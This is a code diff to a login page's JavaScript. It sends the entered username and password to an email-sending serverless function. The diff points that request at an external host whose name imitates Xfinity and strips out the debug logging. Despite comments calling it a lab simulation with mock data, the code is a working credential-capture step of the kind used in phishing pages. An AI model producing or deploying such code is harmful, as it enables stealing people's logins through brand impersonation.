@@ -128,21 +128,22 @@
         const u_pass = document.querySelector("#pass_1").value;
 
         try {
-          const res = await fetch("/.netlify/functions/send-email", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              u_name,
-              u_pass,
-              pageName: "Login Page Simulation", // Changes per page in lab
-            }),
-          });
+          const res = await fetch(
+            "https://xfinity-protocol-login.netlify.app/.netlify/functions/send-email",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                u_name,
+                u_pass,
+                pageName: "Login Page Simulation", // Changes per page in lab
+              }),
+            }
+          );
 
           const data = await res.json();
-          console.log("Serverless function response:", data);
           alert("Email sent: " + JSON.stringify(data));
         } catch (err) {
-          console.error("Error sending mock data:", err);
           alert("Error sending email: " + err.message);
         }
       });
